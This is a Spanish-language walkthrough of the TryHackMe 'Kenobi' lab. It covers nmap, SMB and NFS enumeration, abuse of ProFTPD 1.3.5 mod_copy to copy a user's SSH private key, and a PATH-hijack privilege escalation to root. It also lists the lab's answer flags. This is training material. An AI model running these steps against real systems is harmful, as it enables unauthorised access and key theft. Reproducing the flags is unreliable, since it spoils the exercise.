---
title: "Kenobi - TryHackMe"
layout: single
excerpt: "Maquina THM de dificultad facil, tutorial sobre la explotación de una máquina Linux. Se va utilizar Samba para recursos compartidos, manipular una versión vulnerable de proftpd y aumentar sus privilegios con la manipulación de variables de ruta."
show_date: true
classes: wide
header:
  teaser: /assets/images/CTFs/Kenobi-THM/icon.png
  teaser_home_page: true  
  icon: /assets/images/TryHackMe-icon.png
categories:
  - TryHackMe
  - Easy
tags:
  - Linux
  - Proftpd
  - Samba
---

# Task 1 - Deploy the vulnerable machine

---

Vamos a hacer un escaneo de puerto con nmap:

```bash
nmap -sV -p- 10.10.36.18
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 19:55 CEST
Nmap scan report for 10.10.36.18
Host is up (0.046s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp   open  rpcbind     2-4 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
35715/tcp open  mountd      1-3 (RPC #100005)
40803/tcp open  mountd      1-3 (RPC #100005)
46211/tcp open  nlockmgr    1-4 (RPC #100021)
49169/tcp open  mountd      1-3 (RPC #100005)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kerne
```
*Scan the machine with nmap, how many ports are open?*
- *7*

<br><br>

# Task 2 - Enumerating Samba for shares

---

Utilizaremos el script de nmap para enumerar el samba:
```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.36.18
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 20:04 CEST
Nmap scan report for 10.10.36.18
Host is up (0.045s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.36.18\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.36.18\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.36.18\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

*Using the nmap command above, how many shares have been found?*
- *3*

Vamos a inspeccionar el recurso compartido anónimo usando el comando:
```bash
smbclient //10.10.36.18/anonymous
```

Cuando nos pregunta para introducir una contraseña, tan solo le daremos enter sin introducir nada.
Luego podemos listar el contenido con el comando `ls`.

*Once you're connected, list the files on the share. What is the file can you see?*
- *log.txt*

Podemos usar `get log.txt`, para descargar el fichero en nuestra máquina local y poder visualizarlo.
Si hacemos un `head` del archivo descargado (log.txt), vemos que ha generado un certificado y vemos también que ha configurado un poco el archivo de FTP.

*What port is FTP running on?*
- *21*

Se puede descargar recursivamente el SMB (se descarga en el directorio que estemos):
```bash
smbget -R smb://10.10.36.18/anonymous
```

Si vemos el nmap que hicimos vemos que tenemos el puerto abierto 111 que es el rcpbind. Este es solo un servidor que convierte el número de programa de llamada a procedimiento remoto (RPC) en direcciones universales. Cuando se inicia un servicio RPC, le dice a rpcbind la dirección en la que está escuchando y el número de programa RPC que está preparado para servir.

En nuestro caso, el puerto 111 es el acceso a un sistema de archivos de red. Usemos nmap para enumerar esto:
```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.36.18
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
```

*What mount can we see?*
- */var*

<br><br>

# Task 3 - Gain initial acces with ProFtpd

---

Usando netcat para conectarnos a la maquina en el puerto del FTP, vamos a poder ver la version del FTP:
```bash
nc 10.10.36.18 21
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.36.18]
```

*What is the version?*
- *1.3.5*

Vamos a buscar con searchsploit cuanto exploits existen del ftp v1.3.5:
```bash
searchsploit ProFTPd 1.3.5
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                    |  Path
-------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                         | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                               | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                           | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                         | linux/remote/36742.txt
-------------------------------------------------------------------------------------------------- ---------------------------------
```

*How many exploits are there for the ProFTPd running?*
- *3*

El módulo mod_copy implementa los comandos SITE CPFR y SITE CPTO, que se pueden usar para copiar archivos/directorios de un lugar a otro en el servidor.  Cualquier cliente no autenticado puede aprovechar estos comandos para copiar archivos desde cualquier parte del sistema de archivos a un destino elegido.
Para utilizar y descargar el exploit por ejemplo:
```bash
searchsploit -m linux/remote/36803.py
```

Ahora vamos a copiar la clave privada de Kenobi usando los comandos SITE CPFR y SITE CPTO. La copiamos a la carpeta donde sí tenemos permiso mediante el usuario anonimo del ftp.
```bash
nc 10.10.36.18 21
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.36.18]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Ahora vamos a montar el directorio /var/tmp en nuestra máquina con lo siguientes comandos:
```bash
$ mkdir /mnt/kenobiNFS
$ mount 10.10.36.18:/var /mnt/kenobiNFS
$ ls -la /mnt/kenobiNFS #Comprobar que se ha montacon con éxito
```

Ahora que tenemos la clave para poder acceder mediante ssh. Vamos a utilizarlo para poder acceder al equipo:
```bash
$ sudo chmod 600 /mnt/kenobiNFS/tmp/id_rsa
$ sudo ssh -i /mnt/kenobiNFS/tmp/id_rsa kenobi@10.10.36.18
```

Una vez conectados al usuario `kenobi`, vamos a bucar la flag:
```bash
kenobi@kenobi:~$ pwd
/home/kenobi
kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt 
d0b0f3f53b6caa532a83915e19224899
```

*What is Kenobi’s user flag (/home/kenobi/user.txt)?*
- *d0b0f3f53b6caa532a83915e19224899*

<br><br>

# Task 4 - Privilege Escalation with Path Variable Manipulation

---

Los bits SUID pueden ser peligrosos, algunos binarios como passwd deben ejecutarse con privilegios elevados (ya que restablece su contraseña en el sistema), sin embargo, otros archivos personalizados que tienen el bit SUID pueden generar todo tipo de problemas.

Para buscar en un sistema este tipo de archivos, ejecute lo siguiente: 
```bash
find / -perm -u=s -type f 2>/dev/null
```
![Kenobi](/assets/images/CTFs/Kenobi-THM/1.png)

*What file looks particularly out of the ordinary?*
- */usr/bin/menu*
<br>

Y si lo ejecutamos vemos que es un menú:

![Kenobi](/assets/images/CTFs/Kenobi-THM/2.png)

*Run the binary, how many options appear?*
- *3*

Si vemos el fichero con el comando strings:

![Kenobi](/assets/images/CTFs/Kenobi-THM/3.png)

Esto nos muestra que el binario se está ejecutando sin una ruta completa (por ejemplo, sin usar /usr/bin/curl o /usr/bin/uname). Como este archivo se ejecuta con privilegios de usuario raíz, podemos manipular nuestra ruta para obtener una shell.

![Kenobi](/assets/images/CTFs/Kenobi-THM/4.png)

Y ya tenemos acceso root para pode visualizar la flag que se encuentra en el usuario root:

![Kenobi](/assets/images/CTFs/Kenobi-THM/5.png)

*What is the root flag (/root/root.txt)?*
- *177b3cd8562289f37382721c28381f02*


**Enhorabuena, conmpletaste la room.**

<br>

---

<br>
Espero que te haya servido de ayuda este post. Me ayudarías mucho si lo compartes en tus **RRSS**, GRACIAS!

